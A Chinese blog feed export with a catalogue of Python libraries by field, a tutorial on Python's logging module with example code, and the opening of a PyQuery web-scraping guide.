库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。 Open Mining，商业智能（BI），Pandas的Web界面。 blaze，NumPy和Pandas大数据界面。 SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。 ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。 NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。 Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。 Numba，科学计算速度优化编译器。 pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。 NetworkX，复杂网络的优化软件包。 zipline，交易算法的函数库。 PyDy， Python动态建模函数库。 SymPy,符号数学的Python库。 statsmodels,Python的统计建模和计量经济学。 astropy,天文学界的Python库。 orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。 Open Babel，巴贝尔，开放的化学工具箱。 cclib，化学软件包的计算函数库。 Biopython，免费的生物计算工具包。 bccb，生物分析相关的代码集。 bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。 visvis, 可视化计算模块库，可进行一维到四维数据的可视化。 MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。 Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。 luigi，为批量工作，建立复杂的管道。 mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。 人工智能与机器学习 库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。 Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。 textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。 jieba，结巴，中文分词工具。 snownlp，用于处理中文文本库。 loso，中文分词函数库。 genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。 Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。 scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。 PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。 Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。 Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。 PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。 NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。 Pylearn2，-基于Theano的机器学习库。 hebel，GPU加速，[深度学习]Python库。 gensim，机器学习库。 pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。 Crab，灵活的，快速的推荐引擎。 python-recsys，娱乐系统分析，推荐系统。 vowpal_porpoise，Vowpal Wabbit轻量级Python封装。 Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。 系统与命令行 库名称简介threading，Python标准线程库，更高级别的线程接口。 envoy，特使，Python子线程的函数库。 sh，成熟的子线程替换函数库。 sarge，封装线程。 subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。 eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。 pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。 pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息. cement，一个轻量级的、功能齐全的命令行工具 click，简单优雅的的命令行接口。 clint，Python命令行工具。 cliff，创造多层次指令的命令行程序框架。 Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。 docopt，Python命令行参数分析器。 pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。 Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。 rainbowstream，聪明和漂亮的推特客户终端。 Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。 peewee，小型的ORM解析器。 PonyORM，为ORM提供了一种面向SQL的接口。 MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。 django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。 butterdb，谷歌电子表格的ORM，Python版。 celery，芹菜，异步任务队列/工作，基于分布式消息队列。 huey，休伊，轻量级，多线程任务队列。 mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。 rq，简单的工作队列。 Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。 simpleq，简单的，可扩展的队列，Amazon SQS基础队列。 Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。 funcy，函数编程工具。 Toolz，函数编程工具：迭代器、函数，字典。 CyToolz，Toolz的Cython实现，高性能的函数编程工具。 Ansible，安塞波，极为简单的自动化平台。 SaltStack，基础设施的自动化管理系统。 Fabric，织物，一个简单，远程执行和部署的语言工具。 Fabtools，Fabric的工具函数。 cuisine，热门的Fabric的工具函数。 psutil，跨平台的过程和系统工具模块。 pexpect，控制互动节目。 provy，易于使用的配置系统的Python。 honcho，Foreman的Python接口，用于管理procfile应用工具。 gunnery，多任务执行工具，与网络接口的分布式系统。 fig，快速。独立的开发环境中使用泊坞窗。 APScheduler，轻量级、但功能强大的在线任务调度程序。 django-schedule,Django日程应用程序。 doit,任务流道/生成工具。 Joblib,Python提供的轻量级的流水线工具函数。 Plan，简易生成crontab文件。 Spiff，纯Python实现的，功能强大的工作流引擎。 schedule，Python作业调度。 TaskFlow，有助于使任务执行简单。 ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。 cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。 Cytoolz，python 加速库SWIG，简化封装和接口生成器。 Cython，Python优化静态编译器。 PyPy，Python解释器的 Python实现。 Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。 pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。 ino，Arduino命令行工具。 Pyro，Python的机器人工具包。 pluginbase，一个简单而灵活的Python的插件系统。 itsdangerous，数据安全传输工具。 blinker，快速Python中的信号/事件调度系统。 pychievements，用于创建和跟踪成果框架。 python-patterns，Python中的设计模式。 pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。 数据库 库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。 pickledb,简单和轻量级的K-V键值存储。 TinyDB, 轻量级，面向文档的数据库。 mysql-python，MySQL的Python工具库。 mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。 mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。 oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。 psycopg2，最流行的Python PostgreSQL适配器。 txpostgres，于Twisted的异步驱动，用于PostgreSQL。 queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。 cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。 HappyBase，友好的Apache [Hbase]的函数库。 PyMongo，MongoDB官方客户端。 Plyvel，LevelDB快速和功能丰富的Python接口。 redis-py,redis客户端。 py2neo,Python客户端(基于Neo4j的RESTful接口). telephus,基于Twisted的cassandra客户端。 txRedis，基于Twisted的Redis客户端。 在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！ 【网络】 Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。 Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。 httpie，命令行HTTP客户端，用户友好的cURL的替换工具。 s3cmd，命令行工具，用于管理Amazon S3和CloudFront。 youtube-dl，命令行程序，从YouTube下载视频。 you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。 subliminal，命令行工具，搜索和下载字幕的函数库。 requests，HTTP函数库，更加人性化。 grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。 urllib3，一个线程安全的HTTP连接池，支持文件post。 httplib2，综合HTTP的客户端函数库。 treq， Python API接口，Twisted的HTTP客户。 Mininet，流行的网络仿真器,API采用python编写。 POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。 Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。 SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。 inbox.py，Python的SMTP服务器。 imbox， Python版本IMAP库。 inbox，收件箱，开源邮件工具包。 lamson,SMTP服务器。 flanker,侧卫,电子邮件地址和MIME解析库。 marrow.mailer,高性能可扩展邮件交付框架。 django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。 modoboa，邮件托管和管理平台，包括现代和简化Web UI。 envelopes，邮件工具。 mailjet，批量邮寄mailjet API接口，带统计。 Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。 furl，燃料，小型的的URL解析库库。 purl，简单的，干净的API，操纵URL。 pyshorteners，纯Python库，URL短网址编辑。 short_url，短网址生成。 Scrapy，快速屏幕截取和网页抓取的框架。 portia，波西亚，Scrapy的可视化扩展。 feedparser，信息源解释器 RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。 MechanicalSoup，网站自动化互动测试工具包。 mechanize，网页浏览编程工具。 Demiurge，造物主，-PyQuery的轻量级工具。 newspaper,提取报纸新闻。 html2text,转换HTML为 Markdown格式的文本。 python-goose,HTML内容提取器。 lassie,莱西,人性化的网站内容检索。 micawber,通过UR抓提网页的函数库。 sumy，概要，文本和HTML网页的自动文摘模块。 Haul，距离，可扩展的图像爬虫。 python-readability,可读性工具Arc90,快速的Python接口。 opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。 sanitize，消毒，使混乱的数据变的理智。 AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。 SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。 zeroRPC，基于ZeroMQ和MessagePack的RPC实现。 apache-libcloud，所有云服务的Python接口库。 wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。 streamparse，运行Python代码和数据的实时流。集成了Apache Storm。 boto，亚马逊网络服务接口。 twython，Twitter推特API。 google-api-python-client，谷歌客户端API。 gspread，谷歌电子表格的Python API。 facebook-sdk，facebook平台Python SDK。 facepy，简易的facebook图形APIgmail，Gmail的Python接口。 django-wordpress，Django的WordPress的模型和视图。 Web框架 Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库 PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。 Pylons 基于Python的一个极其高效和可靠的Web开发框架 Zope 开源的Web应用服务器 TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。 QuixoteWeb开发框架Flask,轻量级web框架。 Bottle，快速，简单和轻量级的WSGI模式Web框架。 Pyramid，轻量级，快速，稳定的开源Web框架。 web2py，简单易用的全堆栈Web框架和平台。 web.py，强大、简单的Web框架。 TurboGears，便于扩展的Web框架。 CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。 Grok，基于Zope3的Web框架。 Bluebream，开源的Web应用服务器，原名Zope 3。 guava，轻量级，高性能的Python-Web框架，采用c语言编写。 django-cms，基于Django企业级开源CMS。 djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。 FeinCMS，基于Django的先进内容管理系统。 Kotte，高层次的Python的Web应用框架，基于Pyramid。 Mezzanine，强大，一致，灵活的内容管理平台。 Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。 Plone，基于Zope的开源应用服务器Zope。 Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。 Wagtail，Django内容管理系统。 Widgy，CMS框架，基于Django。 django-oscar，Django奥斯卡，开源的电子商务框架。 django-shop，基于Django的网店系统。 merchant，支持多种付款处理工具。 money，可扩展的货币兑换解决方案。 python-currencies，货币显示格式。 cornice，Pyramid的REST框架。 django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。 django-tastypie，创造精美的Django应用程序API接口。 django-formapi，创建JSON API、HMAC认证和Django表单验证。 flask-api，提供统一的浏览器体验，基于Django框架。 flask-restful，快速构建REST API支持扩展。 flask-api-utils，flask的扩展。 falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。 eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。 sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。 restless，类似TastyPie的框架。 savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。 Genshi，网络感知输出模板工具包。 Mako，马可，Python平台的超高速、轻型模板。 Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。 Spitfire，快速的Python编译模板。 django-haystack,大海捞针,Django模块搜索。 elasticsearch-py,Elasticsearch官方低级的Python客户端。 solrpy,solr客户端。 Whoosh,呼,快速，纯Python搜索引擎库。 Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。 django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。 Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。 dogpile.cache，是Beaker作者的下一代替代作品。 HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。 django-cache-machine，Django缓存机，自动缓存失效，使用ORM。 django-cacheops，自动颗粒事件驱动，ORM缓存失效。 johnny-cache,约翰尼高速缓存框架,Django应用程序。 django-viewlet,渲染模板部件扩展缓存控制。 pylibmc,在libmemcached接口。 WTForms-JSON,JSON表单数据处理扩展。 Deform， HTML表单生成的函数库。 django-bootstrap3，bootstrap3，集成了Django。 django-crispy-forms，Django程序，可以创建优雅的表单。 django-remote-forms，Django的远程表单，Django表格的序列化程序。 django-simple-spam-blocker，Django简单的垃圾邮件拦截器。 django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。 Grappelli，界面花哨的django皮肤。 django-suit，Django替代o界面（仅用于非商业用途）。 django-xadmin，Django管理面板替代工具。 flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。 Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。 Cactus,仙人掌,设计师的网站静态生成器。 Hyde，海德， 基于Jinja2的静态网站生成器。 Nikola，尼古拉-一个静态网站和博客生成器。 Tags，标签，最简单的静态网站生成器。 Tinkerer，工匠，基于Sphinx的静态网站生成器。 asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。 gevent，基于Python的网络库。 Twisted，扭曲，事件驱动的网络引擎。 Tornado，龙卷风，Web框架和异步网络的函数库。 pulsar，脉冲星，事件驱动的并行框架的Python。 diesel，柴油，绿色的，基于事件的I/O框架。 eventlet，WSGI支持异步框架。 pyzmq， 0MQ消息库的Python封装。 txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。 wsgiref，Python标准库，WSGI封装实现，单线程。 Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。 paste，粘贴，多线程，稳定的，久经考验的WSGI工具。 rocket，火箭，多线程服务，基于Pyramid。 netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。 fapws3，异步网络，用C写的。 meinheld，异步WSGI服务器，是用C写的。 bjoern，-快速的、异步WSGI服务器，用C写的。 安全 Permissions函数库，允许或拒绝用户访问数据或函数。 django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。 Authomatic，简单强大的认证/授权客户端。 OAuthLib， 通用，规范，OAuth请求签约工具。 rauth，用于OAuth 1.0，2.0，的Python库。 python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。 python-social-auth，易于安装的社会认证机制。 django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。 django-allauth，Django认证的应用程序。 Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。 jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。 python-jwt，JSON的Web令牌生成和验证模块。 pyjwt，JSON的Web令牌草案01。 python-jws，JSON的Web令牌草案02。 PyCrypto，Python的加密工具包。 Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。 cryptography，密码开发工具包。 PyNac，网络和密码（NaCl）函数库。 hashids，hashids的 Python函数库。 Passlib，安全的密码存储/哈希库，非常高的水平。 hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。 它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512. GUI库 名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。 wxPython，混合wxWidgets的C++类库。 kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。 curse，用于创建终端GUI应用程序。 urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。 pyglet，跨平台的窗口和多媒体库的Python。 Tkinter，是Python事实上的标准GUI软件包。 enaml，创建漂亮的用户界面，语法类似QML。 Toga，托加，OS原生GUI工具包。【构建封装】 pyenv,简单的Python版本管理。 virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。 virtualenvwrapper，是virtualenv的一组扩展。 pew,一套管理多个虚拟环境的工具。 vex，使运行指定的virtualenv命令。 PyRun，一个单文件，无需安装的Python版本管理工具。 PIP，Python包和依赖的管理工具。 easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。 conda，跨平台，二进制软件包管理器。 Curdling，一个管理Python包的命令行工具。 wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库 py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。 pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。 pynsist,构建Windows安装程序的工具，用Python编写。 dh-virtualenv,建立和分发virtualenv(Debian软件包格式) PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。 devpi，PyPI服务器和包装/测试/发布工具。 localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。 buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。 SCons，软件构造工具。 platformio，一个控制台的工具，构建的代码可用于不同的开发平台。 bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包 fabricate，自动为任何编程语言，生成依赖包。 django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。 jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。 webassets，优化管理，静态资源，独特的缓存清除。 fanstatic，球迷，包优化，提供静态文件。 fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。 django-storages，一组自定义存储Django后台。 glue，胶胶，一个简单的命令行工具，生成CSS Sprites。 libsass-python，Sass (层叠样式表)的Python接口。 Flask-Assets，整合应用程序资源。【代码调试】 unittest，Python标准库，单元测试框架。 nose，鼻子，unittest延伸产品。 pytest，成熟的全功能的Python测试工具。 mamba，曼巴，Python的权威测试工具，出自BDD的旗下。 contexts，背景，BDD测试框架，基于C#。 pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。 splinter，分裂，测试Web应用程序的开源工具。 locust，刺槐，可扩展的用户负载测试工具，用Python写的。 sixpack，语言无关的A/B测试框架。 mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。 responses，工具函数，用于mock模拟测试。 doublex-强大的测试框架。 freezegun，通过时间调整，测试模块。 httpretty， HTTP请求的模拟工具。 httmock，mock模拟测试。 coverage，代码覆盖度量测试。 faker，生成模拟测试数据的Python包。 mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。 ForgeryPy，易用的模拟数据发生器。 radar，雷达，生成随机日期/时间。 FuckIt.py，测试Python代码运行。 Code Analysispysonar2，Python类型索引。 pycallgraph,可视化的流量（调用图）应用程序。 code2flow,转换Python和JavaScript代码到流程图。 LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。 Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。 Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。 pdb,Python标准库,Python调试器。 ipdb,IPython使用的PDB。 winpdb，独立于平台的GUI调试器。 pudb，全屏，基于python调试控制台。 pyringe，-可附着于及注入代码到Python程序的调试器。 python-statsd，statsd服务器客户端。 memory_profiler， 内存监视。 profiling，交互式Python分析器。 django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。 flask-debugtoolbar,flask调试工具。 （完）]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-logging模块]]></title>
    <url>%2Fpython-logging%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[为什么会用logging模块 灵活性好，方便配置 输出或保存不同级别日志 logging模块结构logging 在源码中有三个文件,结构如下: 123├── config.py├── handlers.py└── __init__.py __int__.py中实现了基础功能,主要的逻辑就在这个文件中 handlers.py是一些Handlers用起来很方便的. config.py是对配置做处理的方法. 基础12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import logging# 1.初始化 相当于logger = logging.getLogger("test_name")# 2.设置级别logger.setLevel(logging.DEBUG) # 低于这个级别就不去管他# 3. 定义handler:# 在控制台输出 FileHandlersh = logging.StreamHandler() # 定义控制台输出 sh.setLevel(logging.ERROR) # 设置最低级别 达到什么级别的时候管 低于..不执行 # 写在文件里面 SteamHandlerfh = logging.FileHandler(r'file_test.log')fh.setLevel(logging.DEBUG) # 达到什么级别就写到文件里面去# 4. 格式化输出 formatter 注意之间逗号不需要加，只是为了美观formatter = logging.Formatter( '时间：%(asctime)s,' '日志级别:%(levelname)s,' '日志信息：%(message)s,' )sh.setFormatter(formatter) # 设置控制台的样式fh.setFormatter(formatter) # 设置文件的样式# 添加进去logger.addHandler(sh)logger.addHandler(fh)if __name__ == '__main__': logger.debug('测试中') logger.info('正常运行') logger.warn('警告') logger.error('完了error') logger.critical('炸了') # 例如： def func(a): try: num = 40/a logger.info(num) # 正常的话记录 except Exception as e: logger.error(e) # 将错误记录 func(0)## logging 中的级别"""DEBUG：调试信息，通常在诊断问题的时候用得着；INFO：普通信息，确认程序安装预期运行；WARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行；ERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行；CRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。# 对应下面5个方法debuginfoWarningerror critical """ logging常用的格式化:]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>logging</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-PyQuery]]></title>
    <url>%2Fpython-PyQuery%2F</url>
    <content type="text"><![CDATA[Python爬虫解析库，主流的有 PyQuery Beautifulsoup Scrapy Selectors 正则表达式。 PyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，Beautifulsoup 的解析速度比其他几种慢了5倍以上！ 正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错）; Scrapy Selectors支持css，xpath以及正则表达式 ; PyQuery只支持css（css语法更精简一些），类似于jQuery Scrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了） 安装1pip3 install pyquery 使用初始化123456789import requestsfrom pyquery import PyQuery as pqurl = 'https://www.guokr.com/'r = requests.get(url)# 实例化doc = pq(r.text) 获取元素跟jQuery是一样的，也就不细说了，简单举几个小例子 